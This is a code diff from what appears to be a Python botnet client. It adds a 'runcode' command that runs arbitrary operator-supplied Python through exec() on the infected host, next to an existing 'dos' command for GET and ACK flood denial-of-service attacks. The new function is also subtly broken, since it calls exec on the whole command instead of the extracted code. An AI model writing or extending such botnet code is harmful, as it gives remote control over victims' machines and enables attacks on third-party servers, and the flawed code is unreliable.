@@ -55,14 +55,14 @@ scripts_name = {
                         """,
     "playsound":        "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
     "openurl":          "`openurl <url> <how-many-times>` Will open a specified url n times",
-    "dos":              """`dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` Will run Denial-Of-Service Attack."""
-
+    "dos":              """`dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` Will run Denial-Of-Service Attack.""",
+    "runcode":          "`runcode <code>` Will run given python code. This function cant return values.",
 }
 
 
 def split_command(command: str) -> list:
     '''split string by space'''
-    return command.split(' ')
+    return command.split('\n') if '\n' in command else command.split(' ')
 
 
 def get_command_name(command: str) -> str:
@@ -177,6 +177,9 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             
             elif command_name == "dos":
                 return dos(logger,command)
+
+            elif command_name == "runcode":
+                return runcode(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -593,7 +596,15 @@ def dos(logger,command):
                 return "Something Failed. Maybe The Servers Are Down !"
 
         
-
+def runcode(logger,command):
+    code = ' '.join(split_command(command)[1:])
+    logger.info(f"Trying to run {code}")
+    try:
+        exec(command)
+        return "ِDone"
+    except Exception as error:
+        logger.error(f"Something failed while trying to run code. {error}")
+        return f"Something failed while trying to run code. {error}"
 
 
 
